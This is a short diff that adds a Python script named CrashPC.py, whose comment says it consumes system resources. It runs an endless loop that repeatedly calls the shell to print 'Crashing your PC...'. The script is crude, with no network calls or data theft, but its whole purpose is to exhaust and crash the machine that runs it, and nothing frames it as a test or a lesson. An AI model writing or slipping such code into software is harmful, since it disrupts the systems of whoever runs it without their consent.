@@ -1,1 +1,8 @@
 
+# CrashPC.py
+
+import os
+
+# Infinite loop to consume system resources
+while True:
+    os.system("echo 'Crashing your PC...'")
